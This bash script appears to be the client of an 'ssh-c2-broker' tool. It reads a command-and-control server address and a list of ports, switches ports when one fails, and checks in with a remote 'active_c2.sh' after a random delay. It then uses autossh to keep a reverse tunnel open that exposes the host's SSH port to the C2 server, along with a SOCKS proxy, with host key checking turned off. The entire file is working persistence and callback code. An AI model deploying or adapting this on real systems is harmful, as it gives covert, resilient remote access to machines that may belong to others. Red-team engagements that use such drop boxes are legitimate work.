#!/usr/bin/env bash
BAKIFS=$IFS
IFS=$'\n'
log="/opt/ssh-c2-broker/Client/sshconnect.log"
echo "`date`: Starting c2-broker" >>"$log"
touch /opt/ssh-c2-broker/Client/.currentproto.txt
touch /opt/ssh-c2-broker/Client/.currentport.txt
ip=`cat /opt/ssh-c2-broker/Client/c2_ip.txt`
key="/root/id_ed25519"
username="c2"
port_num=`cat /opt/ssh-c2-broker/Client/persistent_port.txt`

service ssh start &>>/dev/null

port=`cat /opt/ssh-c2-broker/Client/c2_port.txt`
ports=`cat /opt/ssh-c2-broker/Client/c2_ports.txt`

portcnt=`echo "$ports" | wc -l`

rebuild="false"
sshconnect="false"
proto="ssh"

# First, check the last known working port with a retry
echo "`date`: Verifying connection on last used port: ${port}" >> "$log"
ssh -i $key -p $port $username@$ip "sleep 5;exit"
if [ $? -eq 0 ]; then
    echo "`date`: Port ${port} is still active." >> "$log"
    sshconnect="true"
    proto="ssh"
else
    echo "`date`: Port ${port} failed. Waiting 30s for retry." >> "$log"
    sleep 30
    ssh -i $key -p $port $username@$ip "sleep 5;exit"
    if [ $? -eq 0 ]; then
        echo "`date`: Port ${port} successfully reconnected on retry." >> "$log"
        sshconnect="true"
        proto="ssh"
    else
        echo "`date`: Port ${port} failed on retry. Scanning for a new port." >> "$log"
    fi
fi

# If the primary port failed, scan all other ports
if [ "$sshconnect" == "false" ]; then
    for checkport in ${ports}; do
        # We already checked the main port, so skip it
        if [ "$checkport" == "$port" ]; then
            continue
        fi

        echo "`date`: Attempting connection on new port ${checkport}" >> "$log"
        ssh -i $key -p $checkport $username@$ip "sleep 5;exit"
        if [ $? -eq 0 ]; then
            echo "`date`: Successfully connected on new port ${checkport}." >> "$log"
            echo $checkport > /opt/ssh-c2-broker/Client/c2_port.txt
            port=$(cat /opt/ssh-c2-broker/Client/c2_port.txt)
            sshconnect="true"
            proto="ssh"
            break
        else
            echo "`date`: Port ${checkport} failed." >> "$log"
        fi
    done
fi


currentproto=`cat /opt/ssh-c2-broker/Client/.currentproto.txt`
currentport=`cat /opt/ssh-c2-broker/Client/.currentport.txt`

if [ "$currentproto" != "$proto" ] || [ "$currentport" != "$port" ]
	then
		echo "`date`: Current Protocol or Port do not match. CurrentProto=${currentproto},Proto=${proto},CurrentPort=${currentport},Port=${port}" >>"$log"
		rebuild="true"
fi

if [ "$rebuild" == "false" ]
	then
		hostname=`hostname`
		sleep 7
		sleep $(( $RANDOM % 60 + 1 ))
		
		# Enhanced Sanity Check with detailed logging
		ssh_output=$(ssh $username@$ip -i $key -p $port "active_c2.sh $port_num" 2>&1)
		ssh_exit_code=$?
		sanitycheck=$(echo "$ssh_output" | grep -w "$hostname" | wc -l)
  		if [ $sanitycheck -lt 1 ]; then
				echo "`date`: Sanity Check verification failed. Hostname '${hostname}' not found in remote script output. ExitCode=${ssh_exit_code}, Output: ${ssh_output}" >> "$log"
				rebuild="true"
			else
				echo "`date`: Sanity Check Passed" >> "$log"
			fi
fi

if [ "$rebuild" == "true" ]
	then
		echo "`date`: Rebuilding tunnels..." >>"$log"
		pids=`ps aux | grep "ssh.*${key}" | grep -v grep | sed 's/ \{1,\}/,/g' | cut -d"," -f2`
		for pid in $pids
			do
				echo "`date`: Killing PID ${pid}" >>"$log"
				kill -9 ${pid}
		done
fi

sshresult=`ps aux | grep "ssh.*${key}" | grep -v grep | wc -l`
if [ $sshresult -lt 2 ]
  	then
		echo "`date`: Starting AutoSSH client. Rebuild=${rebuild},IP=${ip},Port=${port},Persistent_port=${port_num}" >>"$log"
		autossh -i $key -p $port $username@$ip -M 0 -R $port_num:localhost:22 -D 127.0.0.1:9050 -f -T -N -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" -o "StrictHostKeyChecking=no" &
		echo -n "${port}" > /opt/ssh-c2-broker/Client/.currentport.txt
		echo -n "${proto}" > /opt/ssh-c2-broker/Client/.currentproto.txt
fi

IFS=$BAKIFS
